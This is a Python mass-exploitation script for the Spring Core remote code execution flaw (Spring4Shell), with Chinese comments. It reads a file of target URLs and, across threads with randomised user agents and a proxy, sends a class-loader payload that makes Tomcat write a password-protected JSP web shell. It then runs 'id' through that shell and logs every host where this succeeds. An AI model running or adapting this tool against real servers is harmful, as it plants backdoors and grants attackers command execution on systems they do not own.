# Author: @e2a5e
import os
import random
import requests
import argparse
import time
from concurrent.futures import ThreadPoolExecutor

# 屏蔽ssl告警
requests.packages.urllib3.disable_warnings()

# 设置代理方法二
http_proxy = {
    'http': 'http://127.0.0.1:7890',
    'https': 'http://127.0.0.1:7890'
}


def get_random_ua():
    first_num = random.randint(90, 100)
    third_num = random.randint(0, 3200)
    fourth_num = random.randint(0, 140)
    os_type = [
        '(Windows NT 6.1; WOW64)',
        '(Windows NT 10.0; WOW64)',
        '(X11; Linux x86_64)',
        '(X11; Linux i686) ',
        '(Macintosh;U; Intel Mac OS X 12_2_1;en-AU)',
        '(iPhone; U; CPU iPhone OS 15_0_1 like Mac OS X; en-SG)',
        '(Windows NT 10.0; Win64; x64; Xbox; Xbox One) ',
        '(iPad; U; CPU OS 14_5_1 like Mac OS X; en-US) ',
        '(Macintosh; Intel Mac OS X 12_0_1)'
    ]
    chrome_version = 'Chrome/{}.0.{}.{}'.format(
        first_num, third_num, fourth_num)

    random_ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
                          '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
                         )
    return random_ua


exp = '/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(' \
      'request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(' \
      'request.getParameter(%22cmd%22)).getInputStream(' \
      ')%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(' \
      'b))!%3D-1)%7B%20out.println(new%20String(' \
      'b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix' \
      '=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module' \
      '.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources' \
      '.context.parent.pipeline.first.fileDateFormat='


def run_exploit(url):
    headers = {
        "User-Agent": get_random_ua(),
        "Accept-Language": "zh-CN,zh;q=0.9",
        "suffix": "%>//",
        "c1": "Runtime",
        "c2": "<%"
    }

    target = url + exp

    try:
        # res = requests.get(target, headers=headers, verify=False, timeout=5)
        # 设置代理方法二
        res = requests.get(target, headers=headers, verify=False, timeout=5, proxies=http_proxy)
        if res.status_code == 200:
            print('[-] exp执行完成')
        else:
            print('[-] exp执行失败')
            return
    except Exception as e:
        print(e)

    time.sleep(2)

    shell = url + '/tomcatwar.jsp?pwd=j&cmd=id'
    try:
        # print(shell)
        # res_shell = requests.get(shell, headers=headers, verify=False, timeout=5)
        # 设置代理，方法二
        res_shell = requests.get(shell, headers=headers, verify=False, timeout=5, proxies=http_proxy)
        if res_shell.status_code == 200 and 'uid=' in res_shell.content.decode('utf-8'):

            print('[+] Shell:' + shell)
            with open('susses.txt', 'a') as s:
                s.write(shell + '\n')
        else:
            print('[+] Shell连接失败')
    except Exception as e:
        print(e)


def check_url(url):
    if '://' in url:
        return url.replace('\n', '')
    else:
        return 'http://' + url.replace('\n', '').replace('\r', '')


def main():
    parser = argparse.ArgumentParser(description='Spring Core RCE')
    parser.add_argument('--urls', help='target file', required=False)
    parser.add_argument('--proxy', default="", required=False)

    proxy_arg = parser.parse_args().proxy
    url_args = parser.parse_args().urls

    # if proxy_arg:
    #     http_proxy = proxy_arg
    #     # 设置代理，方法一
    #     # os.environ['HTTP_PROXY'] = http_proxy
    #     # os.environ['HTTPS_PROXY'] = http_proxy

    if url_args:
        try:
            pool = ThreadPoolExecutor(max_workers=5)

            f = open(url_args, 'r')
            urls = f.readlines()

            for url in urls:
                url = check_url(url)
                pool.submit(run_exploit, url)

        except Exception as e:
            print(e)
        finally:
            pool.shutdown()
            f.close()
        # run_exploit('http://114.115.245.96:8080')


if __name__ == '__main__':
    main()
